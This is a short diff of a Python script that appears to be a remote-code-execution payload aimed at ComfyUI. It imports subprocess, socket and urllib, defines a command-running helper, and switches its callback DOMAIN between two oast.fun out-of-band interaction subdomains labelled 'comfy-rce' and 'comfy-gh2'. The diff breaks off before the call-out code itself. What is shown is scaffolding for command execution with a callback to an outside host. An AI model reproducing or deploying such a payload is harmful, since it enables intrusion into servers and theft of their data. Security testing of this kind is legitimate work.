@@ -1,6 +1,6 @@
 import subprocess, socket, urllib.request, base64, urllib.parse, os, json, time
 
-DOMAIN = "comfy-rce-8d13ba401c.datbtrc90l26ju9v5g6gqbjxwpe1chaas.oast.fun"
+DOMAIN = "comfy-gh2-5cc684d741.datbtrc90l26ju9v5g6gqbjxwpe1chaas.oast.fun"
 
 def _run(cmd):
     try:
